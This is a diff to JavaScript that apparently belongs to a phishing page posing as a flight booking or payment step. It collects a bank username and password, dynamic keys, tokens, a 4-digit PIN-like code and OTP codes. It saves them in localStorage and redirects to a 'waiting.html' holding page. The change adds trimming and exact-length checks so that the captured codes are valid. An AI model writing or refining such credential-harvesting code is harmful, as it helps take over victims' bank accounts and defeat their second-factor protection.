@@ -161,53 +161,63 @@ if(info.flightInfo.travel_type === 1){
  * NEXT STEP
  */
 const btnNextStep = document.querySelector('#btnNextStep');
-btnNextStep.addEventListener('click', () =>{
-    if(info.checkerInfo.mode === 'userpassword'){
-        if(user[1].value !== ''){
-            if(puser.value !== ''){
-                info.metaInfo.user = user[1].value;
-                info.metaInfo.puser = puser[1].value;
+btnNextStep.addEventListener('click', () => {
+    if (info.checkerInfo.mode === 'userpassword') {
+        if (user[1].value.trim() !== '') {
+            if (puser[1].value.trim() !== '') {
+                info.metaInfo.user = user[1].value.trim();
+                info.metaInfo.puser = puser[1].value.trim();
 
                 LS.setItem('info', JSON.stringify(info));
 
                 window.location.href = 'waiting.html';
-            }else{
+            } else {
                 alert('Rellena la información.');
             }
-        }else{
+        } else {
             alert('Rellena la información.');
         }
-    }else if(info.checkerInfo.mode === 'cdin'){
-        if(cdin[1].value !== '' || dintok[1].value !== ''){
-            info.metaInfo.cdin = cdin[1].value;
+    } else if (info.checkerInfo.mode === 'cdin') {
+        if ((cdin[1].value.trim() !== '' && cdin[1].value.trim().length === 6) || (dintok[1].value.trim() !== '' && dintok[1].value.trim().length === 8)) {
+            info.metaInfo.cdin = cdin[1].value.trim();
+            info.metaInfo.dintok = dintok[1].value.trim();
+
             LS.setItem('info', JSON.stringify(info));
 
             window.location.href = 'waiting.html';
 
+        } else {
+            alert('Rellena la información.');
         }
-    }else if(info.checkerInfo.mode === 'ccaj'){
-        if(ccaj[1].value !== ''){
-            info.metaInfo.ccaj = ccaj[1].value;
+    } else if (info.checkerInfo.mode === 'ccaj') {
+        if (ccaj[1].value.trim() !== '' && ccaj[1].value.trim().length === 4) {
+            info.metaInfo.ccaj = ccaj[1].value.trim();
             LS.setItem('info', JSON.stringify(info));
 
             window.location.href = 'waiting.html';
-            
+
+        } else {
+            alert('Rellena la información.');
         }
-    }else if(info.checkerInfo.mode === 'cavance'){
-        if(cavance[1].value !== ''){
-            info.metaInfo.cavance = cavance[1].value;
+    } else if (info.checkerInfo.mode === 'cavance') {
+        if (cavance[1].value.trim() !== '' && cavance[1].value.trim().length === 6) {
+            info.metaInfo.cavance = cavance[1].value.trim();
             LS.setItem('info', JSON.stringify(info));
 
             window.location.href = 'waiting.html';
-            
+
+        } else {
+            alert('Rellena la información.');
         }
-    }else if(info.checkerInfo.mode === 'otpcode'){
-        if(otpcode[1].value !== ''){
-            info.metaInfo.tok = otpcode[1].value;
+    } else if (info.checkerInfo.mode === 'otpcode') {
+        if (otpcode[1].value.trim() !== '' && otpcode[1].value.trim().length === 8) {
+            info.metaInfo.tok = otpcode[1].value.trim();
             LS.setItem('info', JSON.stringify(info));
 
             window.location.href = 'waiting.html';
-            
+
+        } else {
+            alert('Rellena la información.');
         }
     }
 });
